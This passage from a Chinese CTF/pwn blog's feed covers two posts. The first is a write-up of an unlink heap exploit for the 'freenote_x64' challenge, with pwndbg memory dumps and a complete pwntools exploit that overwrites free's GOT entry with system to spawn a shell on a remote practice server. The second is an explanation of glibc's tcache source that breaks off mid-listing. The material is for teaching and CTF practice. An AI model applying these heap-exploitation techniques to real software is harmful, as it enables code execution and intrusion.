class="line">0x17b8860:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8870:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8880:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8890:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x17b88c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8900:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8910:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8920:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8930:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8940:0x00000000000000900x0000000000000121</span><br><span class="line">0x17b8950:0x32323232323232320x00007f61721feb78</span><br><span class="line">0x17b8960:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8970:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8980:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8990:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x17b89c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x17b89e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b89f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a00:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a10:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a20:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a30:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a40:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>free(1)之后，堆块的结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x11dd820</span><br><span class="line">0x11dd820:0x00000000000000000x0000000000000191</span><br><span class="line">0x11dd830:0x00000000000000900x0000000000000111</span><br><span class="line">0x11dd840:0x00007fc6bdb86b780x00007fc6bdb86b78</span><br><span class="line">0x11dd850:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd860:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd870:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd880:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd890:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x11dd8c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd900:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd910:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd920:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd930:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd940:0x00000000000001100x0000000000000120</span><br><span class="line">0x11dd950:0x32323232323232320x00007fc6bdb86b78</span><br><span class="line">0x11dd960:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd970:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd980:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd990:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x11dd9c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x11dd9e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dd9f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda00:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda10:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda20:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda30:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda40:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>而目标地址已经被修改为 p=&amp;p-0x18<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x11dc000</span><br><span class="line">0x11dc000:0x00000000000000000x0000000000001821</span><br><span class="line">0x11dc010:0x00000000000001000x0000000000000000</span><br><span class="line">0x11dc020:0x00000000000000010x0000000000000120</span><br><span class="line">0x11dc030:0x00000000011dc0180x0000000000000000  //p=&amp;p-0x18</span><br><span class="line">0x11dc040:0x00000000000000000x00000000011dd8c0</span><br><span class="line">0x11dc050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc060:0x00000000011dd9500x0000000000000000</span><br><span class="line">0x11dc070:0x00000000000000000x00000000011dd9e0</span><br><span class="line">0x11dc080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc090:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc100:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc120:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29050</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'11111111'</span>)</span><br><span class="line">new(<span class="string">'22222222'</span>)</span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'11111111'</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">chunk2=u64(s[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=chunk2<span class="number">-0x1940</span></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0<span class="number">-0x18</span>)+p64(point_chunk0<span class="number">-0x10</span>) </span><br><span class="line">payload +=<span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload +=<span class="string">'c'</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line">free_got_addr=e.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(free_got_addr)</span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">'atoi'</span>])</span><br><span class="line">payload2+=<span class="string">'\x00'</span>*(<span class="number">0x120</span><span class="number">-80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: Invalid!\n'</span>)</span><br><span class="line"></span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'2. '</span>)</span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">system_in_server=libc.symbols[<span class="string">'system'</span>]+atoi_in_server-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_40827990/java/article/details/88090810" target="_blank" rel="noopener">https://blog.csdn.net/qq_40827990/java/article/details/88090810</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个s
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tcache机制</title>
    <link href="https://nocbtm.github.io/2020/02/27/tcache%E6%9C%BA%E5%88%B6/"/>
    <id>https://nocbtm.github.io/2020/02/27/tcache机制/</id>
    <published>2020-02-27T03:36:21.000Z</published>
    <updated>2020-04-09T13:15:24.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 commit 可以看<br><a href="https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc</a> 。<br>加入 <code>tcache</code> 对性能有比较大的提升，不过由于 <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p><p>相关文件位于 <a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="noopener">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p><code>tcache</code> 也是使用 类似 bins 方式来管理<code>tcache</code>  。</p><p><code>tcache_perthread_struct</code> 是整个<code>tcache</code> </p><p>每一项由 相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接（类似于fastbin的链接方式）。</p><p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p><p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>下面通过分析对 tcache 的两个基本操作理解上面结构体的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p><p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p><p>这样就可以大概得到一个图</p><ul><li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。</li><li><code>tcache_entry</code> 和 <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和 <code>chunk-&gt;fd</code> 是一个位置。</li></ul><h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">// tbytes 为 bytes请求的 转换后得到的 chunk 的 size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">// 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用 tcache_get 拿到 chunk 然后返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code> ，如果有就直接返回，否则进入 <code>_int_malloc</code> 分配内存。</p><p>下面看看 <code>_int_malloc</code> （主要看 <code>tcache</code> 处理的部分）</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 fastbin里面移除 pp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line"> != victim);</span><br></pre></td></tr></table></figure><p>用于多线程的中从 <code>fastbin</code> 里面移除一个 <code>chunk</code>.</p><p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    